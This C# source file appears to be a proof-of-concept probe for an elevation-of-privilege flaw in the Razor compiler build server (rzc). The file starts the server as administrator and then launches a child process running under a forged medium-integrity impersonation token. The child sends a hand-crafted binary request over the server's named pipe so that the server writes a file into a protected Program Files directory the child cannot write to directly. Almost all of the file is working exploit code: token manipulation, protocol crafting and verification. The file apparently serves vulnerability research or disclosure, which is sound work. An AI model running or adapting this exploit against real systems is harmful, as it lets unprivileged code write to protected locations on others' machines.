using System.Diagnostics;
using System.IO.Pipes;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

internal static class Program
{
    private const uint ProtocolVersion = 2;
    private const int CurrentDirectoryId = 0x51147221;
    private const int CommandLineArgumentId = 0x51147222;
    private const int TempDirectoryId = 0x51147225;

    public static async Task<int> Main(string[] args)
    {
        if (!OperatingSystem.IsWindows())
        {
            Console.WriteLine("WINDOWS_ONLY=True");
            return 0;
        }

        if (args.Length > 0 && args[0] == "attacker-medium")
        {
            return RunMediumAttacker(
                pipeName: args[1],
                sourcePath: args[2],
                outputPath: args[3],
                projectDirectory: args[4],
                marker: args[5]);
        }

        if (args.Length < 1)
        {
            Console.Error.WriteLine("Usage: probe <path-to-rzc.dll>");
            return 2;
        }

        return await RunParentAsync(args[0]);
    }

    private static async Task<int> RunParentAsync(string rzcPath)
    {
        string dotnet = Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");

        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);

        Console.WriteLine($"PARENT_PID={Environment.ProcessId}");
        Console.WriteLine($"PARENT_IS_ADMIN={isAdmin}");
        Console.WriteLine($"PARENT_SID={identity.User?.Value}");
        Console.WriteLine($"RZC_PATH={rzcPath}");

        if (!isAdmin)
        {
            Console.WriteLine("PARENT_ADMIN_REQUIRED=True");
            return 2;
        }

        if (!File.Exists(rzcPath))
        {
            Console.WriteLine("RZC_NOT_FOUND=True");
            return 2;
        }

        string id = Guid.NewGuid().ToString("N");
        string marker = "RZC_RESEARCH_MARKER_" + id;
        string pipeName = "rzc-research-" + id;

        string workRoot = Path.Combine(Path.GetTempPath(), "rzc-eop-" + id);
        string projectDirectory = Path.Combine(workRoot, "project");
        Directory.CreateDirectory(projectDirectory);

        string sourcePath = Path.Combine(workRoot, "input.cshtml");
        File.WriteAllText(sourcePath, $"<h1>{marker}</h1>");

        string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        string privilegedDirectory = Path.Combine(programFiles, "dotnet-rzc-research-" + id);
        Directory.CreateDirectory(privilegedDirectory);

        string outputPath = Path.Combine(privilegedDirectory, "marker.g.cs");
        Console.WriteLine($"PRIVILEGED_DIRECTORY={privilegedDirectory}");
        Console.WriteLine($"OUTPUT_PATH={outputPath}");

        var serverStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"\"{rzcPath}\" server -p \"{pipeName}\" -k 120",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process server = Process.Start(serverStart)
            ?? throw new InvalidOperationException("Failed to start rzc server.");

        Console.WriteLine($"RZC_SERVER_PID={server.Id}");
        await Task.Delay(750);

        string dll = Assembly.GetExecutingAssembly().Location;
        var attackerStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"\"{dll}\" attacker-medium \"{pipeName}\" \"{sourcePath}\" \"{outputPath}\" \"{projectDirectory}\" \"{marker}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process attacker = Process.Start(attackerStart)
            ?? throw new InvalidOperationException("Failed to start attacker process.");

        Task<string> outTask = attacker.StandardOutput.ReadToEndAsync();
        Task<string> errTask = attacker.StandardError.ReadToEndAsync();

        Task attackerExited = attacker.WaitForExitAsync();
        int attackerExit;
        if (await Task.WhenAny(attackerExited, Task.Delay(TimeSpan.FromSeconds(25))) != attackerExited)
        {
            Console.WriteLine($"ATTACKER_TIMEOUT_PID={attacker.Id}");
            try { attacker.Kill(entireProcessTree: true); } catch { }
            try { await attacker.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(5)); } catch { }
            attackerExit = 124;
        }
        else
        {
            attackerExit = attacker.ExitCode;
        }

        string attackerOut = await outTask;
        string attackerErr = await errTask;

        Console.WriteLine("=== ATTACKER STDOUT ===");
        Console.Write(attackerOut);
        Console.WriteLine("=== ATTACKER STDERR ===");
        Console.Write(attackerErr);
        Console.WriteLine($"ATTACKER_EXIT={attackerExit}");

        bool outputExists = File.Exists(outputPath);
        string outputText = outputExists ? File.ReadAllText(outputPath) : string.Empty;
        bool markerPresent = outputText.Contains(marker, StringComparison.Ordinal);

        Console.WriteLine($"BROKER_OUTPUT_EXISTS={outputExists}");
        Console.WriteLine($"BROKER_OUTPUT_MARKER_PRESENT={markerPresent}");
        Console.WriteLine($"BROKER_OUTPUT_LENGTH={outputText.Length}");

        if (!server.HasExited)
        {
            try { server.Kill(entireProcessTree: true); } catch { }
            try { await server.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(5)); } catch { }
        }

        string serverOut = await server.StandardOutput.ReadToEndAsync();
        string serverErr = await server.StandardError.ReadToEndAsync();
        Console.WriteLine("=== RZC SERVER STDOUT ===");
        Console.Write(serverOut);
        Console.WriteLine("=== RZC SERVER STDERR ===");
        Console.Write(serverErr);
        Console.WriteLine($"RZC_SERVER_EXIT={(server.HasExited ? server.ExitCode : -999)}");

        try { Directory.Delete(privilegedDirectory, recursive: true); } catch (Exception ex) { Console.WriteLine($"CLEANUP_PRIVILEGED_DIR_ERROR={ex.Message}"); }
        try { Directory.Delete(workRoot, recursive: true); } catch (Exception ex) { Console.WriteLine($"CLEANUP_WORK_DIR_ERROR={ex.Message}"); }

        bool confirmed =
            attackerOut.Contains("ATTACKER_INTEGRITY_SID=S-1-16-8192", StringComparison.Ordinal) &&
            attackerOut.Contains("ATTACKER_DIRECT_PRIVILEGED_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
            attackerOut.Contains("RZC_PIPE_CONNECTED_UNDER_MEDIUM_IL=True", StringComparison.Ordinal) &&
            attackerOut.Contains("RZC_RESPONSE_TYPE=1", StringComparison.Ordinal) &&
            attackerOut.Contains("RZC_RETURN_CODE=0", StringComparison.Ordinal) &&
            outputExists &&
            markerPresent;

        Console.WriteLine($"RAZOR_BUILD_SERVER_MEDIUM_IL_FILE_WRITE={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
        return confirmed ? 0 : 1;
    }

    private static int RunMediumAttacker(
        string pipeName,
        string sourcePath,
        string outputPath,
        string projectDirectory,
        string marker)
    {
        IntPtr token = CreateMediumRestrictedImpersonationToken();
        try
        {
            if (!SetThreadToken(IntPtr.Zero, token))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetThreadToken failed");
            }

            Console.WriteLine("MEDIUM_THREAD_IMPERSONATION_ACTIVE=True");
            Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
            Console.WriteLine($"ATTACKER_INTEGRITY_SID={GetEffectiveIntegritySid()}");

            bool directAllowed = false;
            try
            {
                File.WriteAllText(outputPath, "DIRECT_MEDIUM_WRITE");
                directAllowed = true;
                try { File.Delete(outputPath); } catch { }
            }
            catch (Exception ex) when (ex is UnauthorizedAccessException or System.Security.SecurityException or IOException)
            {
            }

            Console.WriteLine($"ATTACKER_DIRECT_PRIVILEGED_WRITE_ALLOWED={directAllowed}");
            if (directAllowed)
            {
                return 4;
            }

            using var pipe = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.None);
            try
            {
                pipe.Connect(5000);
                Console.WriteLine("RZC_PIPE_CONNECTED_UNDER_MEDIUM_IL=True");
            }
            catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
            {
                Console.WriteLine($"RZC_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
                return 3;
            }

            string[] commandArgs =
            [
                "generate",
                "-s", sourcePath,
                "-o", outputPath,
                "-r", "input.cshtml",
                "-p", projectDirectory,
                "-t", "taghelpers.json",
                "-v", "Latest",
                "-c", "Default",
            ];

            WriteServerRequest(pipe, projectDirectory, Path.GetTempPath(), commandArgs);
            ReadServerResponse(pipe, out int responseType, out int returnCode, out string stdout, out string stderr);

            Console.WriteLine($"RZC_RESPONSE_TYPE={responseType}");
            Console.WriteLine($"RZC_RETURN_CODE={returnCode}");
            Console.WriteLine($"RZC_RESPONSE_STDOUT={stdout.Replace(Environment.NewLine, " | ")}");
            Console.WriteLine($"RZC_RESPONSE_STDERR={stderr.Replace(Environment.NewLine, " | ")}");

            bool outputExists = File.Exists(outputPath);
            bool markerPresent = outputExists && File.ReadAllText(outputPath).Contains(marker, StringComparison.Ordinal);
            Console.WriteLine($"ATTACKER_OBSERVED_OUTPUT_EXISTS={outputExists}");
            Console.WriteLine($"ATTACKER_OBSERVED_MARKER={markerPresent}");

            return responseType == 1 && returnCode == 0 && outputExists && markerPresent ? 0 : 1;
        }
        finally
        {
            RevertToSelf();
            if (token != IntPtr.Zero)
            {
                CloseHandle(token);
            }
        }
    }

    private static void WriteServerRequest(Stream stream, string workingDirectory, string tempDirectory, IReadOnlyList<string> args)
    {
        using var payload = new MemoryStream();
        using (var writer = new BinaryWriter(payload, Encoding.Unicode, leaveOpen: true))
        {
            writer.Write(ProtocolVersion);
            writer.Write(2 + args.Count);

            WriteArgument(writer, CurrentDirectoryId, 0, workingDirectory);
            WriteArgument(writer, TempDirectoryId, 0, tempDirectory);

            for (int i = 0; i < args.Count; i++)
            {
                WriteArgument(writer, CommandLineArgumentId, i, args[i]);
            }

            writer.Flush();
        }

        byte[] body = payload.ToArray();
        byte[] length = BitConverter.GetBytes(body.Length);
        stream.Write(length, 0, length.Length);
        stream.Write(body, 0, body.Length);
        stream.Flush();
    }

    private static void WriteArgument(BinaryWriter writer, int id, int index, string value)
    {
        writer.Write(id);
        writer.Write(index);
        writer.Write(value.Length);
        writer.Write(value.ToCharArray());
    }

    private static void ReadServerResponse(Stream stream, out int responseType, out int returnCode, out string stdout, out string stderr)
    {
        byte[] lengthBytes = new byte[4];
        ReadExactly(stream, lengthBytes);
        int length = BitConverter.ToInt32(lengthBytes, 0);
        if (length <= 0 || length > 1024 * 1024)
        {
            throw new InvalidDataException($"Invalid response length: {length}");
        }

        byte[] response = new byte[length];
        ReadExactly(stream, response);

        using var reader = new BinaryReader(new MemoryStream(response), Encoding.Unicode);
        responseType = reader.ReadInt32();
        returnCode = -1;
        stdout = string.Empty;
        stderr = string.Empty;

        if (responseType == 1)
        {
            returnCode = reader.ReadInt32();
            _ = reader.ReadBoolean();
            stdout = ReadLengthPrefixedString(reader);
            stderr = ReadLengthPrefixedString(reader);
        }
    }

    private static string ReadLengthPrefixedString(BinaryReader reader)
    {
        int charCount = reader.ReadInt32();
        return new string(reader.ReadChars(charCount));
    }

    private static void ReadExactly(Stream stream, byte[] buffer)
    {
        int offset = 0;
        while (offset < buffer.Length)
        {
            int read = stream.Read(buffer, offset, buffer.Length - offset);
            if (read == 0)
            {
                throw new EndOfStreamException();
            }
            offset += read;
        }
    }

    private static IntPtr CreateMediumRestrictedImpersonationToken()
    {
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_IMPERSONATE = 0x0004;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ADJUST_DEFAULT = 0x0080;
        const uint TOKEN_ADJUST_SESSIONID = 0x0100;
        const uint DISABLE_MAX_PRIVILEGE = 0x00000001;
        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
        const uint SE_GROUP_INTEGRITY = 0x00000020;

        uint desired = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, desired, out IntPtr currentToken))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");
        }

        IntPtr adminSidPtr = IntPtr.Zero;
        IntPtr mediumSidPtr = IntPtr.Zero;
        IntPtr tmlPtr = IntPtr.Zero;
        IntPtr restrictedPrimary = IntPtr.Zero;

        try
        {
            var adminSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
            byte[] adminSidBytes = new byte[adminSid.BinaryLength];
            adminSid.GetBinaryForm(adminSidBytes, 0);
            adminSidPtr = Marshal.AllocHGlobal(adminSidBytes.Length);
            Marshal.Copy(adminSidBytes, 0, adminSidPtr, adminSidBytes.Length);

            var disable = new[]
            {
                new SID_AND_ATTRIBUTES { Sid = adminSidPtr, Attributes = SE_GROUP_USE_FOR_DENY_ONLY }
            };

            if (!CreateRestrictedToken(
                currentToken,
                DISABLE_MAX_PRIVILEGE,
                1,
                disable,
                0,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                out restrictedPrimary))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateRestrictedToken failed");
            }

            var mediumSid = new SecurityIdentifier("S-1-16-8192");
            byte[] mediumSidBytes = new byte[mediumSid.BinaryLength];
            mediumSid.GetBinaryForm(mediumSidBytes, 0);
            mediumSidPtr = Marshal.AllocHGlobal(mediumSidBytes.Length);
            Marshal.Copy(mediumSidBytes, 0, mediumSidPtr, mediumSidBytes.Length);

            var label = new TOKEN_MANDATORY_LABEL
            {
                Label = new SID_AND_ATTRIBUTES
                {
                    Sid = mediumSidPtr,
                    Attributes = SE_GROUP_INTEGRITY,
                }
            };

            tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>());
            Marshal.StructureToPtr(label, tmlPtr, false);

            if (!SetTokenInformation(
                restrictedPrimary,
                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                tmlPtr,
                Marshal.SizeOf<TOKEN_MANDATORY_LABEL>() + mediumSidBytes.Length))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetTokenInformation failed");
            }

            const uint MAXIMUM_ALLOWED = 0x02000000;
            if (!DuplicateTokenEx(
                restrictedPrimary,
                MAXIMUM_ALLOWED,
                IntPtr.Zero,
                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                TOKEN_TYPE.TokenImpersonation,
                out IntPtr impersonationToken))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "DuplicateTokenEx failed");
            }

            return impersonationToken;
        }
        finally
        {
            if (restrictedPrimary != IntPtr.Zero) CloseHandle(restrictedPrimary);
            if (currentToken != IntPtr.Zero) CloseHandle(currentToken);
            if (tmlPtr != IntPtr.Zero) Marshal.FreeHGlobal(tmlPtr);
            if (mediumSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(mediumSidPtr);
            if (adminSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(adminSidPtr);
        }
    }

    private static string GetEffectiveIntegritySid()
    {
        const uint TOKEN_QUERY = 0x0008;
        IntPtr token;
        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, out token))
        {
            int error = Marshal.GetLastWin32Error();
            const int ERROR_NO_TOKEN = 1008;
            if (error != ERROR_NO_TOKEN || !OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out token))
            {
                throw new System.ComponentModel.Win32Exception(error, "Unable to open effective token");
            }
        }

        try
        {
            _ = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out int length);
            int error = Marshal.GetLastWin32Error();
            if (length <= 0)
            {
                throw new System.ComponentModel.Win32Exception(error);
            }

            IntPtr buffer = Marshal.AllocHGlobal(length);
            try
            {
                if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, buffer, length, out _))
                {
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                }

                TOKEN_MANDATORY_LABEL label = Marshal.PtrToStructure<TOKEN_MANDATORY_LABEL>(buffer);
                return new SecurityIdentifier(label.Label.Sid).Value;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }
        finally
        {
            CloseHandle(token);
        }
    }

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenIntegrityLevel = 25,
    }

    private enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation,
    }

    private enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation,
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_MANDATORY_LABEL
    {
        public SID_AND_ATTRIBUTES Label;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateRestrictedToken(
        IntPtr ExistingTokenHandle,
        uint Flags,
        uint DisableSidCount,
        [In] SID_AND_ATTRIBUTES[] SidsToDisable,
        uint DeletePrivilegeCount,
        IntPtr PrivilegesToDelete,
        uint RestrictedSidCount,
        IntPtr SidsToRestrict,
        out IntPtr NewTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        uint DesiredAccess,
        [MarshalAs(UnmanagedType.Bool)] bool OpenAsSelf,
        out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);
}
